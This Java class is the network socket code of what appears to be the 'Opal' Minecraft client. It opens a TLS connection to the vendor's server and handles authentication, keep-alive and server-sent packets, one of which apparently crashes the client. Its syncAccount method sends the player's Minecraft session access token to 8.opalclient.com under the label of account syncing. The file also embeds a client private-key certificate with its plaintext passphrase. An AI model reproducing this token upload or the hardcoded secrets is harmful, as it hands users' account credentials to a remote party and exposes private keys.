package wtf.opal.client.socket;

import net.minecraft.client.session.Session;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import wtf.opal.client.OpalClient;
import wtf.opal.client.ReleaseInfo;
import wtf.opal.client.feature.module.impl.visual.CapeModule;
import wtf.opal.client.feature.module.repository.ModuleRepository;
import wtf.opal.client.notification.NotificationType;
import wtf.opal.client.socket.data.ConfigCache;
import wtf.opal.client.socket.data.UserCache;
import wtf.opal.client.socket.data.VariableCache;
import wtf.opal.client.socket.packet.api.C2SPacket;
import wtf.opal.client.socket.packet.api.S2CPacket;
import wtf.opal.client.socket.packet.api.ServerPacketConsumer;
import wtf.opal.client.socket.packet.impl.c2s.C2SAccountUpdatePacket;
import wtf.opal.client.socket.packet.impl.c2s.C2SKeepAlivePacket;
import wtf.opal.client.socket.packet.impl.c2s.C2SUpgradePacket;
import wtf.opal.client.socket.packet.impl.s2c.*;
import wtf.opal.client.socket.packet.impl.s2c.config.S2CConfigListPacket;
import wtf.opal.client.socket.packet.impl.s2c.config.S2CConfigLoadPacket;
import wtf.opal.protection.annotation.NativeExclude;
import wtf.opal.protection.annotation.NativeInclude;
import wtf.opal.utility.misc.Callables;
import wtf.opal.utility.misc.StringUtility;
import wtf.opal.utility.security.SessionUtility;
import wtf.opal.utility.socket.EncryptionContext;
import wtf.opal.utility.socket.buffer.BufferReader;
import wtf.opal.utility.socket.buffer.BufferWriter;
import wtf.opal.utility.socket.user.User;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;
import java.io.*;
import java.security.KeyStore;
import java.security.cert.Certificate;
import java.security.cert.X509Certificate;
import java.time.ZoneId;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import static wtf.opal.client.Constants.mc;

@NativeInclude
public final class ClientSocket {

    private final List<ServerPacketConsumer> serverPacketConsumers;
    private final VariableCache variableCache;
    private final ConfigCache configCache;
    private final UserCache userCache;

    private ScheduledExecutorService reconnectScheduler;
    private ExecutorService listenerThread;

    private EncryptionContext encryptionContext;
    private Object socket;

    private boolean connected, authenticated, blockMainThread;
    private String lastReceivedWhisperUsername;

    private int keepAliveCount;
    private long magicNumber;

    private static ClientSocket instance;
    private static int connectionCount;

    private ClientSocket() {
        this.serverPacketConsumers = new ArrayList<>();
        this.variableCache = new VariableCache(this);
        this.configCache = new ConfigCache();
        this.userCache = new UserCache();
        this.blockMainThread = true;
    }

    public void connect() {
        if (this.connected) {
            return;
        }

        if (this.listenerThread != null) {
            this.listenerThread.shutdownNow();
        }

        if (SessionUtility.getKeystoreToken() == null && !SessionUtility.requestHandoffAuthorizationOrStop()) {
            return;
        }

        this.listenerThread = Executors.newSingleThreadExecutor();

        try {
            final String clientP12Str = "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";
            final byte[] clientP12 = Base64.getDecoder().decode(clientP12Str);

            final String clientCertPassphrase = "9b5a6c8fbbbdd7efd12cc0fcca672f7891c42c0576cdeb731f14e91501ed1c6c";

            final KeyStore clientKeyStore = KeyStore.getInstance("PKCS12");
            try (final InputStream stream = new ByteArrayInputStream(clientP12)) {
                clientKeyStore.load(stream, clientCertPassphrase.toCharArray());
            }

            final KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
            kmf.init(clientKeyStore, clientCertPassphrase.toCharArray());

            final TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
            tmf.init((KeyStore) null);

            final SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);

//            this.socket = sslContext.getSocketFactory().createSocket("localhost", 16888); // localhost
            this.socket = sslContext.getSocketFactory().createSocket("8.opalclient.com", 16890); // prod
            ((SSLSocket) this.socket).setSoTimeout(10000);
            ((SSLSocket) this.socket).startHandshake();

            Thread.sleep(1000L);

            {
                final Certificate[] certificates = ((SSLSocket) this.socket).getSession().getPeerCertificates();
                if (certificates.length != 2) {
                    Callables.throwError(2_7);
                    return;
                }

                for (final Certificate certificate : certificates) {
                    if (!(certificate instanceof X509Certificate x509) || x509.getVersion() != 3 || !x509.getType().equals("X.509")) {
                        Callables.throwError(2_7);
                        return;
                    }

                    final Object principal = x509.getSubjectX500Principal().getName();
                    final boolean isLetsEncrypt = ((String) principal).startsWith("CN=") && ((String) principal).endsWith(",O=Let's Encrypt,C=US");

                    if (!isLetsEncrypt) {
                        if (!(principal.equals("CN=8.opalclient.com") || principal.equals("CN=local.dev.opalclient.com"))
                                || !(principal.hashCode() == -1295591086 || principal.hashCode() == 71440696)) {
                            Callables.throwError(2_7);
                            return;
                        }
                    }
                }
            }
        } catch (Exception e) {
            if (this.blockMainThread || connectionCount == 0 || e instanceof RuntimeException) {
                Callables.throwError(2_1);
                return;
            }
            e.printStackTrace();
            return;
        }

        this.connected = true;

        {
            this.keepAliveCount = 0;

            this.sendPacket(new C2SKeepAlivePacket((writer) -> {
                writer.writeInt(-119324257);
                writer.writeString(StringUtility.rotate(25, ZoneId.systemDefault().getId()));
                writer.writeLong(this.magicNumber = System.currentTimeMillis());
            }));

            this.incrementKeepAliveCount();
        }

        {
            // block until authed
            if (!this.handleIncomingPackets(true)) {
                Callables.throwError(2_2);
                return;
            }

            connectionCount++;

            // non-blocking
            this.listenerThread.execute(() -> this.handleIncomingPackets(false));
        }

        {
            this.syncAccount();

            OpalClient.getInstance().getNotificationManager()
                    .builder(NotificationType.SUCCESS)
                    .duration(2000)
                    .title("Connection established")
                    .description("Session synced.")
                    .buildAndPublish();
        }

        {
            variableCache.getString("Gray Scaled Suffix");
            variableCache.getString("Auto Play");
            variableCache.getInt("PostGres Error");
            variableCache.getString("Release Version");
            variableCache.getString("Failed to initialize module:");
            variableCache.getInt("NullPointerException:");
            variableCache.getInt("ArrayOutOfIndexException:");
            variableCache.getDouble("Friction Value");
            variableCache.getString("Mode Index Error");
            variableCache.getString("Failed to initialize setting:");
            variableCache.getInt("Failed to initialize width:");
            variableCache.getString("Failed to initialize repository:");
        }
    }

    private boolean handleIncomingPackets(final boolean blocking) {
        if (!blocking && connectionCount == 0 && (this.encryptionContext == null || OpalClient.getInstance().getUser() == null)) {
            Callables.throwError(2_3);
            return false;
        }

        try {
            while (this.connected && !Thread.currentThread().isInterrupted() && (!blocking || this.blockMainThread)) {
                final DataInputStream inputStream = new DataInputStream(((SSLSocket) this.socket).getInputStream());

                final BufferReader reader = new BufferReader(inputStream, this.encryptionContext);
                final int packetId = reader.readInt();

                final Object hostname = ((SSLSocket) this.socket).getInetAddress().getHostName();
                if (!hostname.equals("8.opalclient.com") || hostname.hashCode() != -1035831264) {
                    Callables.throwError(2_8);
                    return false;
                }

//                System.out.println("recv packet (id: " + packetId + ")");
                final S2CPacket packet = this.createPacket(packetId, reader);

                if (this.encryptionContext == null && !(packet instanceof S2CUpgradePacket)) {
                    Callables.throwError(2_4);
                    continue;
                }

                packet.handle();
                serverPacketConsumers.forEach(consumer -> consumer.accept(packet));
            }
        } catch (Throwable throwable) {
            if (throwable instanceof IOException || throwable.getCause() instanceof IOException) {
                this.close();

                if (!blocking) {
                    OpalClient.getInstance().getNotificationManager()
                            .builder(NotificationType.ERROR)
                            .duration(2000)
                            .title("Connection lost")
                            .description("Reconnecting...")
                            .buildAndPublish();

                    this.reconnect();
                }

                return false;
            }

            throwable.printStackTrace();
            throw new RuntimeException(throwable);
        }

        return true;
    }

    private S2CPacket createPacket(final int packetId, final BufferReader reader) throws Exception {
        return switch (packetId) {
            case 0 -> new S2CUpgradePacket(reader);
            case 1 -> new S2CHandshakePacket(reader);
            case 2 -> new S2CErrorDialogPacket(reader);
            case 5 -> new S2CAccountResolvePacket(reader);
            case 6 -> new S2CIRCPacket(reader);
            case 7 -> new S2CConfigListPacket(reader);
            case 8 -> new S2CConfigLoadPacket(reader);
            case 9 -> new S2CChatResponsePacket(reader);
            case 10 -> new S2CKeepAlivePacket(reader);
            case 11 -> new S2CVariableResolvePacket(reader);
            case 12 -> new S2CCrashPacket();
            case 13 -> new S2CTitlePacket(reader);
            default -> {
                Callables.throwError(2_5);
                throw new IllegalArgumentException();
            }
        };
    }

    public void sendPacket(final C2SPacket packet) {
        if (!this.connected) {
            return;
        }

        final boolean encrypt = !(packet instanceof C2SUpgradePacket || (packet instanceof C2SKeepAlivePacket && this.keepAliveCount < 1));
        if (encrypt && this.encryptionContext == null) {
            return;
        }

        final ByteArrayOutputStream baos = new ByteArrayOutputStream();
        final DataOutputStream stream = new DataOutputStream(baos);
        final BufferWriter writer = new BufferWriter(stream, encrypt ? this.encryptionContext : null);

        try {
            writer.writeInt(packet.id());
            packet.serialize(writer);

            final byte[] packetBytes = baos.toByteArray();

            final ByteArrayOutputStream baosWithLen = new ByteArrayOutputStream();
            final DataOutputStream streamWithLen = new DataOutputStream(baosWithLen);

            streamWithLen.writeInt(packetBytes.length);
            streamWithLen.write(packetBytes);

            ((SSLSocket) this.socket).getOutputStream().write(baosWithLen.toByteArray());
        } catch (Exception e) {
//            System.err.println("Failed to send packet (id: " + packet.id() + "): " + e.getMessage());
//            e.printStackTrace();
        }
    }

    @Nullable
    @NativeExclude
    public User getUserOrNull(@NotNull final UUID uuid) {
        if (!this.connected) {
            return null;
        }

        if (uuid.equals(mc.getSession().getUuidOrNull())) {
            return OpalClient.getInstance().getUser();
        }

        return this.userCache.getResolvedUsers().get(uuid);
    }

    public void syncAccount() {
        if (!this.connected || this.encryptionContext == null) {
            return;
        }

        final Session session = mc.getSession();
        if (session.getUuidOrNull() == null /* || session.getAccountType() != Session.AccountType.MSA */) {
            return;
        }

        final ModuleRepository moduleRepository = OpalClient.getInstance().getModuleRepository();
        final CapeModule capeModule = moduleRepository != null
                ? moduleRepository.getModule(CapeModule.class)
                : null;

        this.sendPacket(
                new C2SAccountUpdatePacket(
                        session.getUuidOrNull(),
                        session.getAccessToken(),
                        capeModule != null && capeModule.isEnabled() ? capeModule.getType().getSlug() : null
                )
        );
    }

    public void close() {
        this.connected = this.authenticated = false;
        this.encryptionContext = null;

        this.keepAliveCount = 0;
        this.magicNumber = 0L;

        this.userCache.clear();
        this.variableCache.clear();

        try {
            ((SSLSocket) this.socket).close();
        } catch (IOException ignored) {
        }

        System.clearProperty(String.valueOf(Integer.parseInt(ReleaseInfo.VERSION.replaceAll("[^0-9]", "")) * 89));
    }

    public void reconnect() {
        if (this.reconnectScheduler != null) {
            this.reconnectScheduler.shutdownNow();
        }

        this.reconnectScheduler = Executors.newScheduledThreadPool(1);
        this.reconnectScheduler.scheduleAtFixedRate(() -> {
            if (this.connected) {
                this.reconnectScheduler.close();
                return;
            }

            System.out.println("Attempting to reconnect...");

            try {
                this.connect();
            } catch (Exception ignored) {
            }
        }, 2, 2, TimeUnit.SECONDS);
    }

    public void registerServerPacketConsumer(final ServerPacketConsumer consumer) {
        this.serverPacketConsumers.add(consumer);
    }

    @NativeExclude
    public static ClientSocket getInstance() {
        return instance;
    }

    public static void setInstance() {
        instance = new ClientSocket();
    }

    @NativeExclude
    public boolean isConnected() {
        return this.connected;
    }

    @NativeExclude
    public boolean isAuthenticated() {
        return this.authenticated;
    }

    public VariableCache getVariableCache() {
        return variableCache;
    }

    public ConfigCache getConfigCache() {
        return configCache;
    }

    public UserCache getUserCache() {
        return userCache;
    }

    public EncryptionContext getEncryptionContext() {
        return encryptionContext;
    }

    public void setEncryptionContext(final EncryptionContext encryptionContext) {
        this.encryptionContext = encryptionContext;
    }

    public void setAuthenticated(final boolean authenticated) {
        this.authenticated = authenticated;
    }

    public void setBlockMainThread(final boolean blockMainThread) {
        this.blockMainThread = blockMainThread;
    }

    public String getLastReceivedWhisperUsername() {
        return lastReceivedWhisperUsername;
    }

    public void setLastReceivedWhisperUsername(final String lastReceivedWhisperUsername) {
        this.lastReceivedWhisperUsername = lastReceivedWhisperUsername;
    }

    public int getKeepAliveCount() {
        return keepAliveCount;
    }

    public void incrementKeepAliveCount() {
        this.keepAliveCount++;
        System.setProperty(
                String.valueOf(Integer.parseInt(ReleaseInfo.VERSION.replaceAll("[^0-9]", "")) * 89),
                String.valueOf(48 - this.keepAliveCount)
        );
    }

    public static int getConnectionCount() {
        return connectionCount;
    }

    public long getMagicNumber() {
        return magicNumber;
    }

    public void setMagicNumber(final long magicNumber) {
        this.magicNumber = magicNumber;
    }

}
